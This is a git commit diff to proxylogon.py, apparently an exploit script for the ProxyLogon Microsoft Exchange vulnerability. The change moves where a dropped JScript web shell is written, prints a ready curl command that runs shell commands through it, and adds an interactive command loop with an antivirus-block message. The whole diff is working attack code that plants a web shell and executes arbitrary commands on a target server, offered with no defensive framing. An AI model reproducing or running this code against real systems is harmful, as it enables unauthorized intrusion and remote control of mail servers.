e0ca6053b6e31712654e4e41bc55f539e3cce1c0
lulz <39673284+Udyz@users.noreply.github.com>
2021-03-21 12:32:19 +0700

    Update proxylogon.py

--- proxylogon.py
+++ proxylogon.py
@@ -22,7 +22,7 @@ shell_name = "shell.aspx"
 random_name = id_generator(3) + ".js"
 user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
 
-shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\%s" % shell_name
+shell_path = "inetpub\\wwwroot\\aspnet_client\\%s" % shell_name
 shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path
 shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["exec_code"],"unsafe");}</script>'
 
@@ -188,14 +188,17 @@ if ct.status_code != 200:
     print("Write Shell Error!")
     exit()
 time.sleep(2)
-req_test = requests.get('https://%s/owa/auth/%s'%(target, shell_name), verify=False)
+req_test = requests.get('https://%s/aspnet_client/%s'%(target, shell_name), verify=False)
 if "OAB (Default Web Site)" in req_test.text:
-  print('(+) Webshell drop at https://%s/owa/auth/%s .. Have fun!'%(target, shell_name))
-  print('(+) Code: curl -ik https://%s/owa/auth/%s -d \'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())\''%(target, shell_name))
+  print('(+) Webshell drop at https://%s/aspnet_client/%s .. Have fun!'%(target, shell_name))
+  print('(+) Code: curl -ik https://%s/aspnet_client/%s -d \'exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())\''%(target, shell_name))
   while True:
     cmd = input('CMD: ')
     shell_body_exec = '''exec_code=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall())'''%cmd
-    shell_req = requests.post('https://%s/owa/auth/%s'%(target, shell_name),headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': user_agent},data=shell_body_exec,verify=False)
-    print(shell_req.text.split('Name                            :')[0])
+    shell_req = requests.post('https://%s/aspnet_client/%s'%(target, shell_name),headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': user_agent},data=shell_body_exec,verify=False)
+    if shell_req.status_code == 200:
+        print(shell_req.text.split('Name                            :')[0])
+    else:
+        print('(-) AV block exec cmd!!')
 else:
   print('(!) Webshell not found due to Covid, try again!')
